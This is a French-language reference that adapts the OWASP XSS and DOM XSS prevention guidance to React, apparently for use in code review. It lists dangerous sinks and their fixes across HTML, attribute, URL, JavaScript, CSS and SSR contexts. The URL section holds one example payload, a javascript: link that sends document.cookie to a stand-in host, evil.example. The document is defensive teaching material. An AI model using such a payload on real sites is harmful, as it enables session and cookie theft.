# Prévention XSS en contexte React — référence détaillée

Ce fichier condense les deux OWASP Cheat Sheets sur le XSS (Cross Site Scripting Prevention, et DOM based XSS Prevention) et les reformule pour le contexte React. Consulte-le quand tu dois expliquer _pourquoi_ un pattern est dangereux, ou quand tu dois proposer un correctif précis.

## L'idée de fond

Une donnée non fiable (venant d'un utilisateur, d'une API tierce, de l'URL, du localStorage, etc.) devient dangereuse uniquement quand elle atterrit dans un "sink" qui l'interprète comme du code ou du markup plutôt que comme du texte brut. Le travail de revue consiste à repérer ces sinks et vérifier que la donnée qui les alimente est soit contrôlée (whitelist / validation stricte), soit encodée pour le bon contexte, soit sanitizée.

React encode automatiquement le contenu texte inséré via `{}` dans du JSX — c'est sa protection XSS par défaut. Le risque apparaît dès qu'on sort de ce mécanisme : accès direct au DOM, insertion de HTML brut, ou construction d'URL/attributs à partir de données non validées.

## Les contextes et leurs sinks dangereux

### 1. Contexte HTML (insertion de markup brut)

Sinks à repérer : `dangerouslySetInnerHTML`, `element.innerHTML`, `element.outerHTML`, `document.write(...)`, `document.writeln(...)`.

Le binding JSX classique (`<div>{data}</div>`) est sûr par défaut car React encode le texte. Le danger commence quand le code contourne ce mécanisme pour injecter du HTML tel quel.

- **Dangereux** : `<div dangerouslySetInnerHTML={{ __html: data }} />` avec `data` non filtré.
- **Correctif** : sanitizer la valeur avec une librairie comme DOMPurify avant de l'injecter — `<div dangerouslySetInnerHTML={{ __html: purify.sanitize(data) }} />`. Vérifier aussi que rien ne modifie le résultat sanitizé après coup (un traitement ultérieur peut réintroduire du contenu dangereux), et que la librairie de sanitization est maintenue à jour (les contournements de DOMPurify sont régulièrement découverts).
- Si le composant n'a pas de raison fonctionnelle d'afficher du HTML riche, la vraie correction est d'éviter `dangerouslySetInnerHTML` entièrement et de rendre du texte simple.

### 2. Contexte attribut HTML

Sinks à repérer : attributs passés dynamiquement (`href`, `src`, `style`, attributs `data-*`, ou pire, des handlers `onClick`/`onError`/etc. construits dynamiquement).

- Un attribut qui ne déclenche pas de code (`class`, `id`, `title`, `alt`...) piloté par une donnée non fiable est globalement sûr — React encode ces valeurs pour l'attribut.
- Un attribut qui _peut_ déclencher du code (`href`, `src`, tout `on*`) est le vrai point de risque : ce n'est pas une question d'encodage mais de validation du contenu autorisé (voir section URL ci-dessous).
- Ne jamais construire dynamiquement le _nom_ d'un handler d'événement ou l'assigner à partir d'une chaîne de caractères non fiable — un event handler assigné comme string n'est de toute façon pas exécuté nativement par le DOM, mais y arriver signale presque toujours un problème de conception plus large (mélange de données et de code).

### 3. Contexte URL (`href`, `src`, redirections, `window.location`)

C'est le point le plus spécifique à React signalé par Snyk et la Cheat Sheet DOM XSS : une URL peut commencer comme donnée d'affichage et finir comme code exécutable via le protocole `javascript:`.

- **Dangereux** : `<a href={userControlledUrl}>Cliquer</a>` sans validation — un attaquant peut fournir `javascript:fetch('https://evil.example/steal?c='+document.cookie)`.
- **Correctif** : valider le protocole via une whitelist stricte, jamais une blacklist.

```javascript
function isSafeUrl(url) {
  try {
    const parsed = new URL(url, window.location.origin);
    return ["http:", "https:"].includes(parsed.protocol);
  } catch {
    return false;
  }
}

<a href={isSafeUrl(url) ? url : "#"}>Cliquer</a>;
```

- Le même principe s'applique à `window.location = url`, aux redirections côté client, et aux URLs utilisées dans un `fetch()` si elles proviennent d'un paramètre utilisateur.
- Pour les URLs construites dynamiquement (ajout de query params), encoder chaque valeur avec `encodeURIComponent` avant assemblage, puis vérifier que le résultat final passe la validation de protocole si c'est un lien cliquable.

### 4. Contexte JavaScript / event handlers

Sinks à repérer : `eval(...)`, `new Function(...)`, `setTimeout(stringDeCode, ...)`, `setInterval(stringDeCode, ...)`, accès dynamique à des propriétés via `window[nomControleParUtilisateur]`.

- Le principe OWASP le plus important ici : une donnée non fiable ne doit **jamais** finir du côté gauche d'une expression, ni être passée comme chaîne à une fonction qui l'évalue implicitement. Le "JavaScript encoding" ne neutralise pas l'exécution dans ces sinks — contrairement à un attribut HTML classique, encoder ne suffit pas.
- Si le code utilise `setTimeout` ou `setInterval` avec une chaîne de caractères comme premier argument plutôt qu'une fonction, c'est un signal d'alerte même sans donnée utilisateur visible : remplacer par une closure/fonction.
- `JSON.parse` doit toujours être préféré à `eval()` pour désérialiser du JSON.

### 5. Contexte CSS (styles inline dynamiques)

Sinks à repérer : `element.style.cssText`, injection de chaîne CSS brute, `<style>{data}</style>`.

- Si on pilote dynamiquement une valeur de style depuis React, préférer l'objet `style={{ property: value }}` de React (qui limite mécaniquement l'injection) à une chaîne CSS complète construite à la main.
- Ne jamais laisser une donnée utilisateur définir un _sélecteur_ ou une règle CSS entière — seule une valeur de propriété individuelle doit être pilotable, et encore, avec validation du format attendu (couleur, taille, etc.).

## Accès direct au DOM (refs)

Un pattern qu'on retrouve dans du code React "legacy" ou mal migré : utiliser une `ref` pour manipuler le DOM directement plutôt que de passer par le rendu déclaratif de React.

- **Dangereux** : `this.myRef.current.innerHTML = data;`
- **Correctif** : revenir au rendu déclaratif (`{data}` pour du texte) ou, si du HTML riche est vraiment nécessaire, passer par `dangerouslySetInnerHTML` + sanitization comme décrit plus haut — au moins ce pattern documente explicitement le risque dans le nom de la prop.

## Server-Side Rendering et hydration

Deux pièges spécifiques au SSR React signalés par Snyk :

1. **Concaténation après `renderToStaticMarkup()` / `renderToString()`** — le rendu de React lui-même échappe correctement les données, mais si le code concatène ensuite une chaîne supplémentaire non échappée au résultat avant de l'envoyer au client, la protection est contournée. Toute donnée ajoutée après le rendu React doit être échappée manuellement pour le contexte HTML.
2. **State préchargé (`window.__PRELOADED_STATE__`) sérialisé en JSON** — `JSON.stringify` seul ne suffit pas car un JSON contenant `</script>` peut casser hors du tag script et exécuter du code. Il faut échapper spécifiquement les caractères sensibles en HTML (`<` en particulier) après sérialisation :

```javascript
window.__PRELOADED_STATE__ = ${JSON.stringify(preloadedState).replace(/</g, '\\u003c')}
```

## Sinks "safe" à privilégier

Pour écrire du texte dans le DOM sans passer par React (cas rare, mais ça arrive dans du code d'intégration ou des libs tierces) :

```javascript
element.textContent = data; // sûr, jamais interprété comme code
element.setAttribute(nomFixe, data); // sûr si nomFixe est un attribut inoffensif et codé en dur
formField.value = data; // sûr
```

À l'inverse, `innerText` est parfois présenté à tort comme une alternative sûre à `innerHTML` — ce n'est pas garanti selon le tag ciblé (un `<script>` avec `innerText` défini dynamiquement peut exécuter du code). Ne pas s'y fier comme unique protection.

## Défense en profondeur (au-delà du code applicatif)

Ces contrôles ne remplacent jamais la correction à la source, mais réduisent l'impact d'un bug manqué :

- **Content-Security-Policy (CSP)** — une politique adaptée à l'application, pas un header générique copié-collé, sinon on hérite des faux sentiments de sécurité que dénonce la Cheat Sheet OWASP (illusion de compatibilité universelle, ruptures sur applications legacy).
- **Trusted Types** (navigateurs Chromium) — force les sinks DOM dangereux (`innerHTML`, `outerHTML`, `document.write`...) à passer par une policy validée plutôt que d'accepter une chaîne brute. C'est l'un des rares contrôles qui élimine une classe entière de XSS DOM plutôt que de simplement l'atténuer.
- **Attributs de cookies** (`HttpOnly`, `Secure`, `SameSite`) — limitent ce qu'un XSS réussi peut exfiltrer, sans empêcher l'exécution elle-même.
- Ne jamais compter uniquement sur un WAF ou sur un intercepteur HTTP générique pour filtrer le XSS : ces approches ratent structurellement le XSS DOM-based (qui ne transite pas forcément par une requête serveur) et n'ont pas le contexte nécessaire pour savoir si une donnée finit dans un contexte HTML, JS, CSS ou URL.

## Anti-patterns à signaler même sans preuve d'exploitation

Signale ces patterns dans une revue même si tu n'as pas de preuve d'exploitabilité immédiate — ils indiquent une conception fragile :

- Toute utilisation de `dangerouslySetInnerHTML` sans sanitization visible juste à côté.
- Toute URL affichée ou utilisée en redirection sans validation de protocole.
- Toute utilisation de `eval`, `new Function`, ou `setTimeout`/`setInterval` avec une chaîne de caractères comme code.
- Toute ref DOM utilisée pour écrire du HTML directement plutôt que passer par le rendu React.
- Absence totale de CSP sur une application qui affiche du contenu utilisateur.
